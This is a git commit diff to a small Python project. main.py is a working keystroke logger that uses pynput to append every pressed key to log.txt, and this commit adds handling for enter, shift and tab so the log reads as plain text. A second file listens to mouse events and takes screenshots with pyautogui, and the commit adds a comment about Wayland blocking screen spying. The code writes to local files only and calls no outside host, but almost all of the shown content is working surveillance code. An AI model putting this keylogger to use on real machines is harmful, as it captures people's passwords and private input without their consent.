300abf59a60e46213e3e6518dde28fb086153967
hivakarami <hiva.karami2@gmail.com>
2024-01-03 15:55:14 -0500

    m

--- main.py
+++ main.py
@@ -1,17 +1,23 @@
 from pynput.keyboard import Listener
 
 
+
 def write_to_file(key):
     f = open("log.txt", 'a')
     letter = str(key).replace("'", "")
     # handle Keys
     if(letter == 'Key.space'):
         letter = ' '
+    if(letter == 'Key.enter'):
+        letter = '\n'
+    if(letter == 'Key.shift_r' or letter == 'Key.shift_l' or letter == 'Key.shift'):
+        letter = ''
+    if(letter == 'Key.tab'):
+        letter= '\t'     
+    
     f.write(letter)
     f.close()
 
 
 with Listener(on_press=write_to_file) as lis:
     lis.join()
-    
- 
--- mouse-listener.py
+++ mouse-listener.py
@@ -3,6 +3,7 @@ import pyautogui
     
 cnt = 0
 
+#One of the features of Wayland is its security design, which helps to guard the user against malicious apps. Apps can no longer see everything on the screen and spy on you. But that also means you cannot run a common application (like shutter or gtk-recordmydesktop) and use it to make a screenshot or a screencast of your desktop – it will see only its own window, but nothing else (or it might crash right away). System (trusted) apps need to be used to perform these actions.
 def take_screenshot():
     global cnt
     im = pyautogui.screenshot()
@@ -36,4 +37,4 @@ def on_scroll(x, y, dx, dy):
 with mouse.Listener(on_move=print_current_pos, on_click=on_click, on_scroll=on_scroll) as lis:
     lis.join()
 
-    
+
